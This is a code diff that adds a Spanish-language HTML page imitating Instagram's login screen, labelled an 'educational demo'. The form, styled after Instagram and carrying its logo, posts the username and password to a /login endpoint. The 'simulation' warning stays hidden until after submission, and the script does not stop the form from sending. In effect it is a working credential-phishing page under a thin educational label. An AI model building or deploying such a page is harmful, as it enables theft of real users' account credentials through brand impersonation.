@@ -1,0 +1,72 @@
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram - Demo Educativo</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            width: 350px;
+            padding: 20px 40px;
+            border: 1px solid #dbdbdb;
+            background: white;
+            text-align: center;
+        }
+        .logo { margin: 20px 0; }
+        input {
+            width: 100%;
+            padding: 9px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        button {
+            width: 100%;
+            padding: 7px;
+            margin: 10px 0;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        .warning {
+            color: red;
+            font-size: 11px;
+            margin-top: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" width="175px" alt="Logo Instagram">
+        </div>
+        <form id="loginForm" method="POST" action="/login">
+            <input type="text" name="username" placeholder="Teléfono, usuario o correo" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        <div class="warning" id="warning">
+            ⚠️ <strong>¡SIMULACIÓN EDUCATIVA!</strong> No ingreses datos reales.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            document.getElementById("warning").style.display = "block";
+        });
+    </script>
+</body>
+</html>
